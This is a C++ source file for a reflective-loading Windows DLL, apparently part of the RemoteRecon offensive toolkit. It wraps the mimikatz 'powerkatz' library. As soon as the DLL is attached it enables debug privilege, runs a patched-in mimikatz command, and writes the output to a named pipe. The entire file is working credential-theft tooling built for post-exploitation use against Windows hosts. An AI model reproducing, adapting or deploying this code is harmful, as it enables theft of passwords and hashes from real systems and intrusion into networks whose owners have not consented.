// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "ReflectiveLoader.h"
#include <stdio.h>
#include <Windows.h>

HINSTANCE hAppInstance;
extern "C" __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input);

#ifdef WIN_X86
#pragma comment(lib, "..\\Win32\\powerkatz.lib")
#pragma comment(lib, "..\\lib\\Win32\\ntdll.min.lib")
#pragma comment(lib, "..\\lib\\Win32\\samlib.lib")
#pragma comment(lib, "..\\lib\\Win32\\cryptdll.lib")
#pragma comment(lib, "..\\lib\\Win32\\advapi32.hash.lib")
#endif

#ifdef WIN_X64
#pragma comment(lib, "..\\x64\\powerkatz.lib")
#pragma comment(lib, "..\\lib\\x64\\ntdll.min.lib")
#pragma comment(lib, "..\\lib\\x64\\samlib.lib")
#pragma comment(lib, "..\\lib\\x64\\cryptdll.lib")
#pragma comment(lib, "..\\lib\\x64\\advapi32.hash.lib")
#pragma comment(lib, "Ntdsapi.lib")
#endif

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Secur32.lib")

DWORD SendToPipe(wchar_t *output)
{

	DWORD dwResult = 0;
	HANDLE hPipe1 = INVALID_HANDLE_VALUE;
	char *np = "\\\\.\\pipe\\mm12";
	DWORD bWritten = 0;
	char *data = NULL;
	do
	{
		while (1)
		{
			data = new char[wcslen(output) + 1];
			memset(data, 0, wcslen(output) + 1);
			WideCharToMultiByte(CP_ACP, 0, output, -1, (LPSTR)data, wcslen(output), NULL, NULL);

			hPipe1 = CreateFileA(np, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
			if (hPipe1 != INVALID_HANDLE_VALUE) { dwResult = 0; break; }
			if (!WaitNamedPipeA(np, 15000)) { dwResult = 1; break; }
		}

		if (!WriteFile(hPipe1, data, strlen(data), &bWritten, NULL)) { dwResult = 1; break; }

	} while (0);

	if (data) delete data;

	if (hPipe1 != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hPipe1);
		hPipe1 = INVALID_HANDLE_VALUE;
	}

	return dwResult;
}

wchar_t *DoStuff()
{
	char *cmd = "Replace-Me                                                                      "; /*Patched by RemoteReconCore*/
	powershell_reflective_mimikatz(L"privilege::debug");
	return powershell_reflective_mimikatz((WCHAR*)cmd);
}

BOOL WINAPI DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	BOOL bReturnValue = TRUE;
	wchar_t *ret = NULL;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		ret = DoStuff();
		SendToPipe(ret);
		break;
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

